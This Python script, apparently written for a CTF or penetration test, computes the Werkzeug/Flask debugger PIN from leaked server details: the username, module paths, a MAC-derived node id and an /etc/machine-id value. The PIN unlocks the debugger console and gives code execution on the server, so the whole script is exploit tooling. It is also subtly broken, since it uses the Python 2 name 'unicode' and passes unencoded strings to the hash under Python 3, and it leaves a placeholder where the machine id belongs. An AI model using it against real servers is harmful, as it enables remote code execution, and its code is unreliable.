import hashlib 
from itertools import chain
import os
import getpass

pin = None
rv = None
num = None

probably_public_bits = [ 
  'root' , # username (preso da source code supervisord.conf)
  'flask.app' , # modname
  'Flask',
  '/usr/local/lib/python3.10/site-packages/flask/app.py'    #preso da messaggio di errore
  ] 

private_bits = [ 
  '191101483950643' ,   # str(uuid.getnode()),  /sys/class/net/lo/address
  'my serial number'    # get_machine_id(), /etc/machine-id
  ] 

h = hashlib.md5() 

# Bit is going through every thing in probably_public_bits and private_bits

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, unicode):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt") 

if num is None : 
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9] 

if rv is None : 
    for group_size in 5 , 4 , 3 : 
        if len (num)% group_size == 0 : 
            rv = '-' .join (num [x: x + group_size] .rjust (group_size, '0' ) 
            for x in range ( 0 , len (num), group_size)) 
            break 
        else : 
            rv = num

print (rv)